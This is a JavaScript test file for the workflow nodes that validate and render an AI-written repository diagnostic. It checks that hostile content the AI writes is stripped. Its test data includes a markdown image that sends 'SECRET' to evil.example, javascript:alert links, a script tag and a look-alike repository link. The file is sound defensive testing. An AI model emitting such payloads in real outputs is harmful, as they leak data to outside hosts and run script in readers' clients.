// Code nodes "Validate and Finalize Diagnostic" and "Render Report": what the AI answer may contain before it reaches Notion and the e-mail.
import test from 'node:test';
import assert from 'node:assert/strict';
import { runCode } from './harness.mjs';

const REPO = 'https://github.com/acme/tool';
const RATING = { value: 3, justification: 'x', confidence: 'low', unratedReason: null };
const verdict = (detail = 'ok', evidence = `${REPO}/blob/v1/README.md#install`) => ({ verdict: 'compatible', detail, evidence });

const report = (extra = {}) => ({
  repository: 'acme/tool', tldr: { recommendation: 'ok', mainBenefit: 'b', mainLimit: 'l', nextStep: 'n' }, usefulness: 'u',
  existingAndAlternatives: { knownEquivalents: [], externalAlternatives: [], conclusion: 'c' },
  compatibility: Object.fromEntries(['windows', 'wsl', 'cpu', 'gpu', 'ram', 'storage', 'dependencies'].map(k => [k, verdict()])),
  conflicts: [], risks: [], projectCosts: [],
  firstTrial: { feasibleLocally: true, prerequisites: [], steps: ['a'], expectedResult: 'r', durationMinutes: 20, resources: 'x', stop: 's', cleanup: 'c' },
  ratings: Object.fromEntries(['usefulFeatures', 'easeOfUse', 'easeOfInstallation', 'pcPerformance', 'cost', 'privacy', 'documentation', 'maintenance', 'modifiability'].map(k => [k, RATING])),
  examinedScope: { documents: [], issues: [], limits: '' }, unknowns: [], ...extra,
});

const answer = (overrides = {}) => ({
  output: { recommendation: 'ok', reports: [report()], comparison: null, usedContext: [{ id: 'profile-1', usage: 'u' }],
    sources: [{ url: `${REPO}/releases/tag/v1`, type: 'github', usage: 'u' }], unknowns: [], ...overrides },
});

const validate = input => runCode('Code - Validate and Finalize Diagnostic', {
  input,
  nodes: {
    CONFIGURATION: { schemaVersion: '3.1', diagnosticModel: 'gemini-flash-latest' },
    'Set - Gather Prompt Inputs': {
      request: { id: 'req-1', mode: 'single', receivedAt: new Date().toISOString() },
      repositories: [{ key: 'acme/tool', url: REPO, tag: 'v1', versionKind: 'stable release', releaseUrl: `${REPO}/releases/tag/v1`, publishedAt: '', license: 'MIT' }],
      profile: [{ id: 'profile-1', label: 'p', text: 't' }], inventory: [],
      decisions: [{ id: 'decision-1', repository: 'acme/old', decision: 'installé', url: 'https://www.notion.so/decision-1' }],
      machine: {}, profileRevision: '', matches: [], limits: [],
    },
    'Set - Parse and Validate Request': { goal: '' },
  },
}).then(([item]) => item.json);

test('a valid answer is kept, with the links to the examined repository', async () => {
  const result = await validate(answer());
  assert.equal(result.failed, false, result.failureReason);
  assert.equal(result.diagnostic.status, 'done');
  assert.equal(result.diagnostic.reports[0].compatibility.windows.evidence, `${REPO}/blob/v1/README.md#install`);
  assert.deepEqual(result.diagnostic.sources.map(s => s.url), [`${REPO}/releases/tag/v1`]);
  assert.equal(result.diagnostic.repositories[0].versionKind, 'stable release');
});

test('images, remote links, script links and HTML-like tags written by the AI are removed', async () => {
  const hostile = report({
    usefulness: `Utile ![](https://evil.example/c.png?d=SECRET) voir [guide](https://evil.example/x) ou javascript:alert(1) <script>x</script> et torch>=2.7,<2.12.0`,
    existingAndAlternatives: { knownEquivalents: [], externalAlternatives: [{ name: 'click', url: 'https://evil.example', justification: 'j' }], conclusion: 'c' },
    compatibility: { ...report().compatibility, windows: verdict('ok', 'https://github.com/acme/tool-evil/blob/v1/README.md') },
  });
  const result = await validate(answer({ reports: [hostile], sources: [{ url: 'https://evil.example/s', type: 'web', usage: 'u' }] }));
  const text = JSON.stringify(result.diagnostic);
  assert.equal(result.failed, false, result.failureReason);
  assert.doesNotMatch(text, /evil\.example|SECRET|javascript:|<script/);
  assert.match(result.diagnostic.reports[0].usefulness, /torch>=2\.7,<2\.12\.0/, 'version ranges are not damaged');
  assert.equal(result.diagnostic.reports[0].existingAndAlternatives.externalAlternatives[0].url, '');
  assert.match(result.diagnostic.reports[0].compatibility.windows.evidence, /link removed/, 'a look-alike repository is not trusted');
  assert.deepEqual(result.diagnostic.sources.map(s => s.url), [`${REPO}/releases/tag/v1`], 'the cited sources fall back to the examined version');
  assert.match(result.diagnostic.unknowns.join(), /not part of the inputs/);
});

test('links to the examined repository, its issues and the user decisions survive', async () => {
  const result = await validate(answer({ unknowns: [`voir ${REPO}/issues/12 et https://www.notion.so/decision-1.`] }));
  assert.match(result.diagnostic.unknowns[0], new RegExp(`${REPO}/issues/12 et https://www.notion.so/decision-1`));
});

test('the checks stay strict: no source, unknown context id, wrong repository, bad rating, failed AI call', async () => {
  const cases = {
    'no source cited': answer({ sources: [] }),
    'not part of the provided': answer({ usedContext: [{ id: 'profile-9', usage: 'u' }] }),
    'repository differs': answer({ reports: [report({ repository: 'other/thing' })] }),
    'out of range': answer({ reports: [report({ ratings: { ...report().ratings, cost: { ...RATING, value: 9 } } })] }),
    'AI call failed': { error: { message: 'service unavailable' } },
  };
  for (const [reason, input] of Object.entries(cases)) {
    const result = await validate(input);
    assert.equal(result.failed, true, reason);
    assert.match(result.failureReason, new RegExp(reason), reason);
    assert.equal(result.diagnostic.status, 'failed');
  }
});

const DateTime = { fromISO: () => ({ setZone: () => ({ setLocale: () => ({ toFormat: () => '23 octobre 2026' }) }) }) };

test('the e-mail never links to anything but https', async () => {
  const { diagnostic } = await validate(answer());
  const tampered = structuredClone(diagnostic);
  tampered.sources = [{ url: 'javascript:alert(1)', usage: 'x' }];
  tampered.reports[0].url = 'javascript:alert(2)';
  tampered.reports[0].existingAndAlternatives.externalAlternatives = [{ name: 'click', url: 'javascript:alert(3)', justification: 'j' }];
  const [{ json }] = await runCode('Code - Render Report', { input: { diagnostic: tampered }, nodes: {}, DateTime });
  assert.doesNotMatch(json.emailHtml, /href="javascript:/i);
  assert.match(json.emailHtml, /__NOTION_BLOCK__/);
});
